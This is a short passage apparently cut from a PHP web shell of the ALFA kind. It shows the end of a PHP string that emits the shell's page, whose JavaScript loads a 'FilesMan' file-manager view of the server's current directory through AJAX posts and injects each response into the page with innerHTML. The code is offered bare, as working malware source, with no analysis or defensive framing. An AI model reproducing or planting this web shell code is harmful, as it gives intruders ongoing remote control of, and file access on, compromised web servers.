<div id="ajaxarea" class="ajaxarea"></div>
<script type="text/javascript">
var alfa_can_add_opt = false;
function g(act, path, sec) {
    var ajaxarea = document.getElementById("ajaxarea");
    var data = "ajax=1&act=" + act;
    if (path) data += "&path=" + encodeURIComponent(path);
    if (sec) data += "&sec=" + sec;
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            ajaxarea.innerHTML = xhr.responseText;
        }
    };
    xhr.send(data);
}
window.onload = function() {
    g("FilesMan", "'.str_replace("\\","/",$GLOBALS['cwd']).'");
};
</script>
</body>
</html>';
